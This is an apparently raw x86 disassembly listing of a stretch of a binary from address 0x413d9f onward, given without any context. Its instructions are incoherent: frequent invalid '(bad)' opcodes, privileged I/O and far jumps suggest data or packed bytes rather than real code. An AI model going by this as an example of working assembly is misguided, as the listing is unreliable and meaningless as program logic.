  413d9f:	data16 xlat BYTE PTR ds:[ebx]
  413da1:	idiv   ecx
  413da3:	mov    al,0xfb
  413da5:	cmp    edi,DWORD PTR [edi-0x2e]
  413da8:	shl    DWORD PTR [ebp+0x13],0xd9
  413dac:	mov    ?,WORD PTR [eax-0x24]
  413daf:	mov    ebp,0xeeb36323
  413db4:	jl     0x413d6c
  413db6:	fild   DWORD PTR [eax+0x73]
  413db9:	mov    eax,ds:0xbfe70d52
  413dbe:	push   ds
  413dbf:	aam    0x8f
  413dc1:	retfw  0x48ca
  413dc5:	jecxz  0x413d56
  413dc7:	inc    esi
  413dc8:	or     DWORD PTR [ecx],eax
  413dca:	cs pushf 
  413dcc:	sub    eax,0x5445667f
  413dd1:	cmp    al,0x1b
  413dd3:	retf   0xc06d
  413dd6:	cld    
  413dd7:	jo     0x413d96
  413dd9:	adc    BYTE PTR [esi],ah
  413ddb:	pop    eax
  413ddc:	(bad)  
  413ddd:	idiv   DWORD PTR [ebx+eax*8-0x48]
  413de1:	push   esi
  413de2:	ret    
  413de3:	mov    ebp,DWORD PTR [ebx+0x69f4ab0a]
  413de9:	push   eax
  413dea:	jle    0x413d89
  413dec:	imul   edi,DWORD PTR [edx-0x370da3cf],0x45
  413df3:	adc    al,0x4b
  413df5:	dec    ecx
  413df6:	xchg   edi,eax
  413df7:	ret    
  413df8:	sbb    DWORD PTR [esi+edx*4-0x4e],esp
  413dfc:	inc    ebx
  413dfd:	les    edi,FWORD PTR [edi]
  413dff:	or     al,0xa4
  413e01:	push   0x1b
  413e03:	retf   0x876e
  413e06:	mov    cl,0x8c
  413e08:	sbb    edi,DWORD PTR [ebp+0x65]
  413e0b:	daa    
  413e0c:	addr16 call 0x3b3b486b
  413e12:	adc    al,0x73
  413e14:	push   es
  413e15:	jg     0x413e70
  413e17:	popa   
  413e18:	mov    ebx,0x9c68c20
  413e1d:	mov    bh,0x2b
  413e1f:	ins    DWORD PTR es:[edi],dx
  413e20:	std    
  413e21:	data16 fcomp DWORD PTR [ecx+0x5517d230]
  413e28:	or     ebx,DWORD PTR [ebx]
  413e2a:	or     ah,BYTE PTR [ebp+0x47173ce5]
  413e30:	jns    0x413dcd
  413e32:	push   ecx
  413e33:	leave  
  413e34:	int3   
  413e35:	xchg   ebp,eax
  413e36:	push   es
  413e37:	add    DWORD PTR [ecx],edi
  413e39:	fdiv   DWORD PTR [esi+0x28]
  413e3c:	mov    edx,0x95d462f6
  413e41:	lahf   
  413e42:	jle    0x413e6e
  413e44:	inc    esp
  413e45:	cmp    ah,bh
  413e47:	pop    eax
  413e48:	dec    edx
  413e49:	xchg   edi,eax
  413e4a:	mov    dh,0x6b
  413e4c:	dec    edi
  413e4d:	push   ecx
  413e4e:	pusha  
  413e4f:	jge    0x413e84
  413e51:	adc    cl,0x4c
  413e54:	cmp    eax,0x8c25b6a5
  413e59:	ret    
  413e5a:	jp     0x413eab
  413e5c:	add    dh,BYTE PTR [ecx]
  413e5e:	test   DWORD PTR [edi],edx
  413e60:	push   ebp
  413e61:	jns    0x413e34
  413e63:	push   eax
  413e64:	dec    esi
  413e65:	dec    edx
  413e66:	in     al,0x6
  413e68:	lahf   
  413e69:	xor    esp,ebx
  413e6b:	push   esp
  413e6c:	mov    ebx,esi
  413e6e:	xchg   ebx,eax
  413e6f:	jg     0x413ecc
  413e71:	out    dx,al
  413e72:	add    eax,0xb1942f66
  413e77:	jecxz  0x413e95
  413e79:	jge    0x413e95
  413e7b:	xchg   DWORD PTR [esi-0x6b0e4a4],edi
  413e81:	leave  
  413e82:	iret   
  413e83:	in     eax,dx
  413e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e85:	sbb    BYTE PTR [ecx+0x4bd592b9],0x89
  413e8c:	ja     0x413e29
  413e8e:	and    eax,0x7636f7ff
  413e93:	test   eax,0x96d79a07
  413e98:	dec    ebp
  413e99:	(bad)  [edi]
  413e9b:	xchg   esp,eax
  413e9c:	adc    DWORD PTR [esi+eax*8],esi
  413e9f:	out    dx,al
  413ea0:	push   ss
  413ea1:	cmp    esi,DWORD PTR [esi+0x57]
  413ea4:	stos   DWORD PTR es:[edi],eax
  413ea5:	jmp    0x413e9f
  413ea7:	js     0x413ed0
  413ea9:	fld    TBYTE PTR [edi+0x4c]
  413eac:	outs   dx,DWORD PTR ds:[esi]
  413ead:	cmp    eax,0xbec8be88
  413eb2:	jmp    0x413f07
  413eb4:	xchg   ebx,esp
  413eb6:	test   eax,0x8c9069e1
  413ebb:	bound  eax,QWORD PTR [ebp+0x5c]
  413ebe:	test   al,bl
  413ec0:	push   ebp
  413ec1:	xor    al,0x92
  413ec3:	popf   
  413ec4:	and    al,0x8d
  413ec6:	stos   DWORD PTR es:[edi],eax
  413ec7:	lods   eax,DWORD PTR ds:[esi]
  413ec8:	ja     0x413ecb
  413eca:	sub    ch,al
  413ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ecd:	xor    ebx,ebx
  413ecf:	stos   BYTE PTR es:[edi],al
  413ed0:	test   bh,ch
  413ed2:	cmc    
  413ed3:	xchg   esi,eax
  413ed4:	xchg   ecx,eax
  413ed5:	into   
  413ed6:	pushf  
  413ed7:	add    eax,DWORD PTR [esi-0xb806c2a]
  413edd:	into   
  413ede:	jno    0x413f0d
  413ee0:	shl    BYTE PTR [ebx+0x3bbd4d],0x9e
  413ee7:	std    
  413ee8:	dec    esi
  413ee9:	adc    al,0xaa
  413eeb:	mov    esi,0xeda839ce
  413ef0:	push   esi
  413ef1:	jle    0x413eb0
  413ef3:	or     ebp,DWORD PTR [ecx+0x53]
  413ef6:	inc    esi
  413ef7:	mov    ds:0xf11c9cd1,al
  413efc:	hlt    
  413efd:	or     BYTE PTR [ebp+0x27b7da4e],0x11
  413f04:	push   0x15
  413f06:	out    dx,eax
  413f07:	jg     0x413f1b
  413f09:	add    edx,esi
  413f0b:	mov    BYTE PTR [ebx],ah
  413f0d:	(bad)  
  413f0f:	sahf   
  413f10:	mov    BYTE PTR [edx+0x35e0c960],dh
  413f16:	clc    
  413f17:	nop
  413f18:	ds aas 
  413f1a:	xchg   DWORD PTR [esi+0x2f900f5c],edx
  413f20:	xor    al,BYTE PTR [esi-0x74d6142e]
  413f26:	cmp    eax,0xb88ee1af
  413f2b:	xchg   esi,ecx
  413f2d:	in     al,0x4d
  413f2f:	jno    0x413f0a
  413f31:	adc    al,0x7
  413f33:	and    BYTE PTR [edi-0x61],0xdf
  413f37:	outs   dx,BYTE PTR ds:[esi]
  413f38:	mov    bh,0xfc
  413f3a:	sbb    al,0x3e
  413f3c:	out    dx,al
  413f3d:	loop   0x413f97
  413f3f:	clc    
  413f40:	ret    
  413f41:	push   ecx
  413f42:	pop    eax
  413f43:	ds es push ds
  413f46:	ss and al,0x65
  413f49:	pop    esi
  413f4a:	inc    edx
  413f4b:	push   0xffffffeb
  413f4d:	jecxz  0x413f8d
  413f4f:	mov    esp,0xa48ff69a
  413f54:	(bad)  
  413f55:	xor    BYTE PTR [edx],ch
  413f57:	inc    DWORD PTR [edi+0x60]
  413f5a:	sbb    bl,BYTE PTR [eax+0x25]
  413f5d:	fwait
  413f5e:	(bad)  
  413f5f:	xchg   ebx,eax
  413f60:	push   esi
  413f61:	adc    DWORD PTR [ebx+0x5ad9afc7],esi
  413f67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f68:	xor    dh,cl
  413f6a:	inc    DWORD PTR [edx-0x3c]
  413f6d:	cld    
  413f6e:	fild   QWORD PTR [esi-0x42]
  413f71:	scas   eax,DWORD PTR es:[edi]
  413f72:	mov    BYTE PTR [esi+edx*4+0x16a89549],cl
  413f79:	inc    eax
  413f7a:	enter  0x8e58,0x88
  413f7e:	out    dx,eax
  413f7f:	ror    DWORD PTR [edi-0x41],0x42
  413f83:	jne    0x413f2d
  413f85:	cmp    edi,DWORD PTR [esi+0x9]
  413f88:	xlat   BYTE PTR ds:[ebx]
  413f89:	xor    ebp,DWORD PTR [edx]
  413f8b:	popf   
  413f8c:	imul   ebp,ebx,0xa370a474
  413f92:	push   ss
  413f93:	stos   BYTE PTR es:[edi],al
  413f94:	sbb    DWORD PTR [edx-0x1e53ea26],esi
  413f9a:	dec    eax
  413f9b:	dec    esp
  413f9c:	sub    eax,0x7ea8145f
  413fa1:	xchg   edx,eax
  413fa2:	add    esp,DWORD PTR [ebp+0x39bc721c]
  413fa8:	out    0xd6,al
  413faa:	cwde   
  413fab:	pop    eax
  413fac:	inc    eax
  413fad:	int    0x1
  413faf:	shl    ch,1
  413fb1:	dec    esi
  413fb2:	dec    ebx
  413fb3:	jl     0x413fa1
  413fb5:	repnz pop ecx
  413fb7:	jbe    0x413f70
  413fb9:	inc    edi
  413fba:	or     BYTE PTR [edi-0x103e4d1f],dh
  413fc0:	mov    ebp,?
  413fc2:	jae    0x413f65
  413fc4:	jae    0x414000
  413fc6:	dec    eax
  413fc7:	call   0x5b0cc36e
  413fcc:	push   ss
  413fcd:	fsubr  st(2),st
  413fcf:	pop    eax
  413fd0:	jnp    0x413fa1
  413fd2:	sbb    ebp,esi
  413fd4:	mov    cl,0x2f
  413fd6:	cmc    
  413fd7:	inc    eax
  413fd8:	iret   
  413fd9:	adc    esi,DWORD PTR [esi+ebp*4-0x36]
  413fdd:	sbb    ah,bh
  413fdf:	mov    ds:0x9748b460,eax
  413fe4:	sub    al,0x96
  413fe6:	pop    ebx
  413fe7:	xor    ch,ah
  413fe9:	pop    ebx
  413fea:	jae    0x413fc3
  413fec:	mov    edx,0x73eff7cf
  413ff1:	(bad)  
  413ff2:	popa   
  413ff3:	pop    es
  413ff4:	xor    cl,BYTE PTR ds:0x90b8a17d
  413ffa:	sbb    BYTE PTR [ecx],dh
  413ffc:	mov    bh,0xea
  413ffe:	add    cl,BYTE PTR [ebp+0x33]
  414001:	lock pusha 
  414003:	inc    edx
  414004:	inc    edx
  414005:	dec    ebx
  414006:	cmp    eax,0xe30e5a84
  41400b:	mov    bh,BYTE PTR [ecx+edi*2]
  41400e:	test   al,0x47
  414010:	ficom  DWORD PTR [eax+0x6d]
  414013:	adc    BYTE PTR [edi+0x6725a8af],cl
  414019:	adc    bl,BYTE PTR [ebx-0x80]
  41401c:	fs pushf 
  41401e:	push   eax
  41401f:	aas    
  414020:	ret    0x8ce9
  414023:	mov    WORD PTR [esp+ebx*1-0x556c01d3],es
  41402a:	mov    edx,DWORD PTR [eax+0x51]
  41402d:	add    ebp,DWORD PTR [esp+eiz*2]
  414030:	pop    ecx
  414031:	mov    edx,0x114af12a
  414036:	aam    0x25
  414038:	icebp  
  414039:	dec    eax
  41403a:	xor    ebp,DWORD PTR [eax+0x14468843]
  414040:	sahf   
  414041:	jne    0x414053
  414043:	mov    edi,0x3c78f550
  414048:	fisttp DWORD PTR [edx+ebp*2]
  41404b:	lds    esi,FWORD PTR [eax+0x63a489f]
  414051:	cmc    
  414052:	or     al,0x6
  414054:	pop    edx
  414055:	jecxz  0x414008
  414057:	inc    edi
  414058:	sub    eax,0xa2c899aa
  41405d:	(bad)  
  41405e:	fild   QWORD PTR [ebx+0x2023c6f4]
  414064:	imul   ebx,DWORD PTR [esi+0x5b0e66ff],0x10
  41406b:	pushf  
  41406c:	stos   DWORD PTR es:[edi],eax
  41406d:	mov    eax,0xb6fba40
  414072:	data16 or ah,BYTE PTR [ebp+edx*4-0x2889e6a4]
  41407a:	call   0x578d:0xbbc25ffa
  414081:	jb     0x414047
  414083:	adc    esi,esi
  414085:	add    DWORD PTR [esi],0xffffff93
  414088:	pop    ds
  414089:	out    0xe9,al
  41408b:	retf   0x236c
  41408e:	dec    ebx
  41408f:	hlt    
  414090:	or     DWORD PTR gs:[ebp+ecx*1+0x20fcf0d4],ebp
  414098:	test   ah,dl
  41409a:	inc    ecx
  41409b:	ja     0x41411c
  41409d:	xlat   BYTE PTR ds:[ebx]
  41409e:	(bad)
  4140a1:	jle    0x414050
  4140a3:	popf   
  4140a4:	xor    eax,0xc9c32017
  4140a9:	cmp    DWORD PTR [eax],edi
  4140ab:	adc    DWORD PTR [eax-0x74],eax
  4140ae:	jne    0x41405e
  4140b0:	scas   al,BYTE PTR es:[edi]
  4140b1:	out    dx,eax
  4140b2:	mov    esi,DWORD PTR [ecx+0x7bf1e9a0]
  4140b8:	cmc    
  4140b9:	std    
  4140ba:	or     ebp,DWORD PTR [ebx]
  4140bc:	std    
  4140bd:	mov    ecx,0x9c9b7845
  4140c2:	add    eax,0x23736031
  4140c7:	mov    DWORD PTR [esi-0x40],esi
  4140ca:	pop    ds
  4140cb:	test   BYTE PTR [eax],bl
  4140cd:	jle    0x41413f
  4140cf:	xchg   esp,eax
  4140d0:	fiadd  WORD PTR [ebp+0x9062ffb]
  4140d6:	mov    bh,0x1b
  4140d8:	dec    DWORD PTR [edx+0x2e45d00e]
  4140de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140df:	jg     0x4140be
  4140e1:	jmp    0x7547:0xe087c6a2
  4140e8:	mov    ds:0x2df2b6bd,eax
  4140ed:	repnz mov bh,0xcb
  4140f0:	sbb    al,dh
  4140f2:	test   eax,ebx
  4140f4:	in     al,0x1
  4140f6:	add    eax,0xacb294ce
  4140fb:	mov    ebp,ebx
  4140fd:	in     al,0x26
  4140ff:	mov    DWORD PTR [edx],ebx
  414101:	int    0xb0
  414103:	in     eax,0x3b
  414105:	psrld  mm5,mm5
  414108:	rcr    BYTE PTR [esi-0x2],cl
  41410b:	or     BYTE PTR [edi+ecx*2],cl
  41410e:	ret    
  41410f:	lock sub DWORD PTR [esi+0x32],edx
  414113:	or     BYTE PTR [edx-0x7de38b10],0x97
  41411a:	ficom  WORD PTR [edi-0x5652f5fd]
  414120:	(bad)  
  414121:	les    eax,FWORD PTR [esi-0x58]
  414124:	nop
  414125:	stos   BYTE PTR es:[edi],al
  414126:	rol    BYTE PTR [esi+eax*2-0x3d],1
  41412a:	fs sbb esi,edx
  41412d:	ja     0x41415c
  41412f:	sbb    al,BYTE PTR [eax+ebx*8+0x17]
  414133:	xchg   DWORD PTR [esi-0x27],eax
  414136:	lock fwait
  414138:	adc    eax,0x2f058360
  41413d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41413e:	push   edi
  41413f:	sbb    al,0x4c
  414141:	nop
  414142:	mov    eax,ds:0xb1546adf
  414147:	les    ecx,FWORD PTR [ecx-0x16]
  41414a:	lahf   
  41414b:	pop    edi
  41414c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41414d:	or     al,0x60
  41414f:	push   edx
  414150:	add    DWORD PTR [edx+0x92ac071],ebp
  414156:	pusha  
  414157:	aas    
  414158:	sbb    bl,bh
  41415a:	sbb    al,0xc6
  41415c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41415d:	ins    DWORD PTR es:[edi],dx
  41415e:	hlt    
  41415f:	ins    DWORD PTR es:[edi],dx
  414160:	cmovno ebx,DWORD PTR [esi+edx*4+0x4c]
  414165:	mov    ah,BYTE PTR [esi+0x2172de90]
  41416b:	push   edx
  41416c:	xchg   edx,eax
  41416d:	pop    ds
  41416e:	cmp    dh,BYTE PTR [eax-0x63]
  414171:	stc    
  414172:	mov    esp,0x17156c67
  414177:	jle    0x41418f
  414179:	push   es
  41417a:	xor    esi,DWORD PTR [edx]
  41417c:	scas   eax,DWORD PTR es:[edi]
  41417d:	inc    edi
  41417e:	mov    ds:0x3d5a83e7,eax
  414183:	ret    0xfc05
  414186:	sub    DWORD PTR [esi-0x5e],esp
  414189:	sti    
  41418a:	push   cs
  41418b:	scas   eax,DWORD PTR es:[edi]
  41418c:	std    
  41418d:	add    ebx,DWORD PTR [eax-0x6]
  414190:	mov    ah,0xb5
  414192:	add    BYTE PTR [ebp-0x52d7df19],bl
  414198:	xor    BYTE PTR [esi],0x96
  41419b:	call   0xb462:0x53e5b64e
  4141a2:	stc    
  4141a3:	mov    BYTE PTR [edi],ch
  4141a5:	mov    al,0x5c
  4141a7:	jns    0x41415d
  4141a9:	pop    es
  4141aa:	sahf   
  4141ab:	add    eax,0xa53c73ab
  4141b0:	shl    DWORD PTR [ebx+ecx*1],1
  4141b3:	lods   al,BYTE PTR ds:[esi]
  4141b4:	and    al,0x6c
  4141b6:	mov    dh,0xb5
  4141b8:	push   ds
  4141b9:	pusha  
  4141ba:	(bad)  
  4141bb:	cmp    al,bl
  4141bd:	xchg   edi,eax
  4141be:	mov    al,ds:0x3918e675
  4141c3:	sub    esp,DWORD PTR [esi]
  4141c5:	add    DWORD PTR [ecx+0x4b],esp
  4141c8:	ins    BYTE PTR es:[edi],dx
  4141c9:	in     al,dx
  4141ca:	and    al,0xd8
  4141cc:	xchg   ebp,eax
  4141cd:	add    al,0xf5
  4141cf:	sub    DWORD PTR [ebp+0x4def6714],esi
  4141d5:	call   0x654f:0x5bd2ff35
  4141dc:	inc    esp
  4141dd:	mov    edx,0xf60190a8
  4141e2:	lods   al,BYTE PTR ds:[esi]
  4141e3:	pop    eax
  4141e4:	inc    eax
  4141e5:	loope  0x41425b
  4141e7:	iret   
  4141e8:	outs   dx,BYTE PTR ds:[esi]
  4141e9:	std    
  4141ea:	je     0x4141ba
  4141ec:	sub    DWORD PTR [edx-0x3c],esp
  4141ef:	sbb    bl,dh
  4141f1:	mov    esi,0xfc9b85e8
  4141f6:	outs   dx,DWORD PTR ds:[si]
  4141f8:	mov    ebp,0x21952103
  4141fd:	sbb    DWORD PTR [bx+di+0x65f7],0xcd89e558
  414206:	dec    ebp
  414207:	sub    DWORD PTR [esi+0xb93992b],edx
  41420d:	jecxz  0x4141d4
  41420f:	cwde   
  414210:	or     eax,0x1883a42f
  414215:	and    esi,DWORD PTR [esi+ebx*4-0x424f63da]
  41421c:	cld    
  41421d:	leave  
  41421e:	ret    
  41421f:	xchg   ebx,eax
  414220:	jg     0x414286
  414222:	mov    esp,0xa6edae47
  414227:	lods   eax,DWORD PTR ds:[esi]
  414228:	jmp    0x4141b5
  41422a:	call   0xbb43:0x10c000cb
  414231:	mov    ebx,0xe70c242
  414236:	mov    ch,0x7d
  414238:	jno    0x4142af
  41423a:	int    0x4b
  41423c:	mov    bl,0x95
  41423e:	push   esp
  41423f:	out    0x1f,eax
  414241:	push   ebx
  414242:	xchg   al,ch
  414244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414245:	xchg   esp,eax
  414246:	mov    edi,0x2c9d9201
  41424b:	push   edx
  41424c:	jecxz  0x4142be
  41424e:	dec    esi
  41424f:	ins    DWORD PTR es:[edi],dx
  414250:	sbb    DWORD PTR [edi],ebp
  414252:	cdq    
  414253:	jl     0x4141e1
  414255:	aad    0x1d
  414257:	cmp    eax,0xcfa9db55
  41425c:	mov    DWORD PTR [edx],0x9fa974b2
  414262:	fcom   QWORD PTR [ebx]
  414264:	daa    
  414265:	push   eax
  414266:	mov    bh,0x64
  414268:	stos   BYTE PTR es:[edi],al
  414269:	fstp   DWORD PTR [esi+0x28ca9e9d]
  41426f:	mov    esi,0xf1284d59
  414274:	arpl   WORD PTR [edx],cx
  414276:	pop    esp
  414277:	inc    eax
  414278:	dec    ebp
  414279:	cwde   
  41427a:	fisubr WORD PTR ds:0x64b7ca8f
  414280:	(bad)  
  414281:	(bad)  
  414282:	sbb    eax,esp
  414284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414285:	ror    DWORD PTR [edi-0x3c6ccc14],0x95
  41428c:	in     eax,dx
  41428d:	lahf   
  41428e:	sbb    dh,ch
  414290:	enter  0xb7ec,0x3
  414294:	outs   dx,BYTE PTR ds:[esi]
  414295:	inc    ebp
  414296:	fwait
  414297:	mov    bl,0x72
  414299:	leave  
  41429a:	rcl    DWORD PTR [eax+0x2fa3cb82],1
  4142a0:	out    0x1c,eax
  4142a2:	or     BYTE PTR [edx],al
  4142a4:	stos   BYTE PTR es:[edi],al
  4142a5:	or     DWORD PTR [eax-0x40],0x223fd128
  4142ac:	sub    ecx,DWORD PTR [edi-0x4e251852]
  4142b2:	xchg   ebx,eax
  4142b3:	push   eax
  4142b4:	push   ds
  4142b5:	pop    esi
  4142b6:	in     al,0x65
  4142b8:	or     eax,0x7a021d08
  4142bd:	loopne 0x414252
  4142bf:	adc    BYTE PTR [eax+0x6e405911],0x16
  4142c6:	inc    ecx
  4142c7:	outs   dx,DWORD PTR ds:[esi]
  4142c8:	in     al,0xe8
  4142ca:	rcr    BYTE PTR [edx-0x4b],1
  4142cd:	mov    esi,0xf18f70fe
  4142d2:	cdq    
  4142d3:	mov    ebx,0xcdc601c4
  4142d8:	pop    eax
  4142d9:	inc    ebx
  4142da:	dec    eax
  4142db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142dc:	jne    0x41429b
  4142de:	sbb    al,0x87
  4142e0:	jae    0x414276
  4142e2:	ret    0x468e
  4142e5:	stos   DWORD PTR es:[edi],eax
  4142e6:	lds    esi,FWORD PTR [ecx-0x19]
  4142e9:	push   edi
  4142ea:	into   
  4142eb:	sti    
  4142ec:	cmp    eax,eax
  4142ee:	lods   eax,DWORD PTR ds:[esi]
  4142ef:	push   eax
  4142f0:	aas    
  4142f1:	sbb    bh,bh
  4142f3:	mov    dl,0x0
  4142f5:	mov    bl,0xc0
  4142f7:	loopne 0x414338
  4142f9:	stc    
  4142fa:	lds    eax,FWORD PTR [edi+0x52]
  4142fd:	in     eax,0xc6
  4142ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414300:	mov    cl,0xef
  414302:	xchg   esp,ecx
  414304:	jle    0x4142e2
  414306:	popf   
  414307:	fisttp DWORD PTR [ecx+0x75]
  41430a:	push   esi
  41430b:	mov    bh,0x8b
  41430d:	mov    edi,0x600ab9b9
  414312:	sub    al,ah
  414314:	sbb    al,dl
  414316:	adc    edi,DWORD PTR [edx-0x8]
  414319:	scas   eax,DWORD PTR es:[edi]
  41431a:	mov    edi,0xf0c41dde
  41431f:	not    BYTE PTR [ecx]
  414321:	lea    ebx,[ebx+eax*8+0x3cf0d4dc]
  414328:	mov    ds:0x2f9f2618,al
  41432d:	mov    ch,0x7f
  41432f:	in     eax,0xdd
  414331:	mov    edi,0xf0976e63
  414336:	and    DWORD PTR ds:[eax],edi
  414339:	pop    ebp
  41433a:	mov    ch,0x60
  41433c:	ds jmp 0x6dbc:0x9c310bb9
  414344:	inc    edi
  414345:	rol    DWORD PTR [edi],0x49
  414348:	xor    eax,0xe5ee49e1
  41434d:	sub    al,cl
  41434f:	fild   QWORD PTR [edx]
  414351:	inc    edi
  414352:	cmp    dl,BYTE PTR [esi+edi*1]
  414355:	imul   ebp,DWORD PTR [edi+0x74],0xffffffa8
  414359:	(bad)  
  41435a:	fsubr  QWORD PTR [ecx]
  41435c:	jg     0x4142ec
  41435e:	sahf   
  41435f:	outs   dx,BYTE PTR ds:[esi]
  414360:	hlt    
  414361:	sub    BYTE PTR [esi-0x79eefdf9],0x6d
  414368:	enter  0xf714,0x11
  41436c:	shl    DWORD PTR [ebx+eax*2+0x29],cl
  414370:	mov    ah,BYTE PTR [ebx+0x78]
  414373:	add    al,0x43
  414375:	xor    ah,BYTE PTR [edx+ebx*2-0x325ed447]
  41437c:	push   es
  41437d:	xchg   DWORD PTR [eax+0x4c],esp
  414380:	cwde   
  414381:	sti    
  414382:	lods   al,BYTE PTR ds:[esi]
  414383:	push   esp
  414384:	fwait
  414385:	jmp    DWORD PTR [ecx-0x56]
  414388:	not    BYTE PTR [ecx+0x1c]
  41438b:	jp     0x4143e8
  41438d:	adc    ah,BYTE PTR [ecx-0x5dd8fdac]
  414393:	lods   al,BYTE PTR ds:[esi]
  414394:	inc    edx
  414395:	add    dl,BYTE PTR [esi+ecx*2+0x5a7aebc4]
  41439c:	(bad)  
  41439d:	jp     0x41438b
  41439f:	sub    DWORD PTR [ecx+edx*4-0x68],ebp
  4143a3:	pop    edx
  4143a4:	add    BYTE PTR [eax+0x46d523aa],dl
  4143aa:	sbb    cl,al
  4143ac:	fs mov ecx,0x4aecaa4f
  4143b2:	das    
  4143b3:	cmp    esp,DWORD PTR [edi+eiz*1]
  4143b6:	xchg   DWORD PTR [edx],esp
  4143b8:	es cli 
  4143ba:	sbb    DWORD PTR [ecx+ebx*4-0x5cdd8cbd],esp
  4143c1:	retf   0x3bda
  4143c4:	adc    ah,BYTE PTR [esi-0x739d5607]
  4143ca:	mov    al,0x91
  4143cc:	aad    0xa9
  4143ce:	mov    esp,0xcca80657
  4143d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d4:	fs jns 0x41438c
  4143d7:	jo     0x414418
  4143d9:	jl     0x4143f5
  4143db:	fimul  DWORD PTR [ebp-0x6805db80]
  4143e1:	scas   eax,DWORD PTR es:[edi]
  4143e2:	jns    0x4143c1
  4143e4:	inc    esp
  4143e5:	xor    DWORD PTR [ebx],0x7d8d2c20
  4143eb:	sbb    cl,ch
  4143ed:	mov    bh,BYTE PTR [esp+edi*4]
  4143f0:	loope  0x414444
  4143f2:	sahf   
  4143f3:	push   ebp
  4143f4:	mov    eax,ds:0x5f64d641
  4143f9:	pop    esp
  4143fa:	pop    eax
  4143fb:	push   ds
  4143fc:	scas   al,BYTE PTR es:[edi]
  4143fd:	fld    DWORD PTR [ebx+0x5b3a6557]
  414403:	stos   BYTE PTR es:[edi],al
  414404:	mov    ah,0xd7
  414406:	lods   al,BYTE PTR ds:[esi]
  414407:	lahf   
  414408:	test   eax,0xfee654fa
  41440e:	lea    ecx,[ecx-0x3e4815e7]
  414414:	pop    eax
  414415:	pop    esi
  414416:	inc    ebp
  414417:	xchg   BYTE PTR ds:0x72b7040a,al
  41441d:	inc    ebx
  41441e:	xchg   edi,ecx
  414420:	mov    cl,0x1b
  414422:	sbb    BYTE PTR [ecx+0x18c0aadd],ch
  414428:	frndint 
  41442a:	scas   al,BYTE PTR es:[edi]
  41442b:	cdq    
  41442c:	push   0x64cdd7d1
  414431:	fwait
  414432:	ins    BYTE PTR es:[edi],dx
  414433:	int    0xe5
  414435:	neg    BYTE PTR [ecx+0x1ed21508]
  41443b:	mov    ch,BYTE PTR [ecx+0x7115567a]
  414441:	mov    ebp,0x653c551
  414446:	jbe    0x414404
  414448:	xchg   DWORD PTR [esp+edx*4+0x8],eax
  41444c:	sbb    ah,dl
  41444e:	adc    DWORD PTR [eax+0x7d],esi
  414451:	test   eax,0x4e19ccc0
  414457:	add    DWORD PTR [edx],ebx
  414459:	shr    DWORD PTR [eax-0x2b],0x74
  41445d:	das    
  41445e:	shl    BYTE PTR [edx+0x1],0x35
  414462:	jnp    0x4143f8
  414464:	stos   BYTE PTR es:[edi],al
  414465:	loop   0x414437
  414467:	inc    ecx
  414468:	scas   al,BYTE PTR es:[edi]
  414469:	push   ebx
  41446a:	or     ebx,DWORD PTR [edx]
  41446c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446d:	push   eax
  41446e:	mov    ah,0xf0
  414470:	sbb    BYTE PTR ds:0x5720c7eb,bl
  414476:	and    DWORD PTR [ebp-0x19e90c14],eax
  41447c:	popf   
  41447d:	out    0xf9,al
  41447f:	pop    ds
  414480:	mov    ecx,0x91f5682b
  414485:	sbb    eax,0xe13ef7e3
  41448a:	stc    
  41448b:	cwde   
  41448c:	hlt    
  41448d:	call   0xc0dc:0x8f4fa947
  414494:	or     ebp,ecx
  414496:	mov    ah,0x69
  414498:	fimul  WORD PTR [edx]
  41449a:	fistp  QWORD PTR [ebx]
  41449c:	bound  ebp,QWORD PTR [eax]
  41449e:	pop    esi
  41449f:	sahf   
  4144a0:	pop    edx
  4144a1:	repnz fld QWORD PTR [ecx+0x17f11b7b]
  4144a8:	push   ebp
  4144a9:	xchg   edi,eax
  4144aa:	sub    DWORD PTR cs:[di+0xa],eax
  4144af:	push   ds
  4144b0:	adc    BYTE PTR [esi],0x20
  4144b3:	xor    eax,0xfad7fb8b
  4144b8:	push   edi
  4144b9:	(bad)  [ecx]
  4144bb:	retf   
  4144bc:	into   
  4144bd:	xlat   BYTE PTR ds:[ebx]
  4144be:	mov    esi,0x993953de
  4144c3:	mov    ah,0x26
  4144c5:	push   esp
  4144c6:	xchg   ebp,eax
  4144c7:	xchg   ecx,eax
  4144c8:	hlt    
  4144c9:	cli    
  4144ca:	ficomp DWORD PTR [edx+ecx*1]
  4144cd:	je     0x4144c0
  4144cf:	inc    esi
  4144d0:	mov    WORD PTR [esi-0x39],cs
  4144d3:	bound  ebp,QWORD PTR [eax]
  4144d5:	les    ebx,FWORD PTR [eax+0x60042c7b]
  4144db:	aad    0x12
  4144dd:	cdq    
  4144de:	and    DWORD PTR [esp+ecx*2],0xfb95bdbb
  4144e5:	lock repnz sbb eax,0x45e9a6b5
  4144ec:	pop    edi
  4144ed:	stos   DWORD PTR es:[edi],eax
  4144ee:	xchg   edx,eax
  4144ef:	push   esi
  4144f0:	and    BYTE PTR [edi+0x45cd643d],ch
  4144f6:	aaa    
  4144f7:	shl    ebx,cl
  4144f9:	mov    al,0x45
  4144fb:	idiv   DWORD PTR [esi-0x67b04a0e]
  414501:	fadd   st(1),st
  414503:	inc    ebx
  414504:	cwde   
  414505:	loope  0x41452f
  414507:	or     BYTE PTR [edi],dl
  414509:	(bad)  
  41450b:	jp     0x414538
  41450d:	push   cs
  41450e:	test   ah,0xf0
  414511:	dec    esp
  414512:	mov    fs,WORD PTR [ebx]
  414514:	jae    0x4144d5
  414516:	cmc    
  414517:	cmp    cl,BYTE PTR [edx]
  414519:	pop    DWORD PTR [edi+0x78]
  41451c:	not    BYTE PTR [ecx-0x7c5d288c]
  414522:	hlt    
  414523:	push   esp
  414524:	mov    ebp,0xc7aaa30b
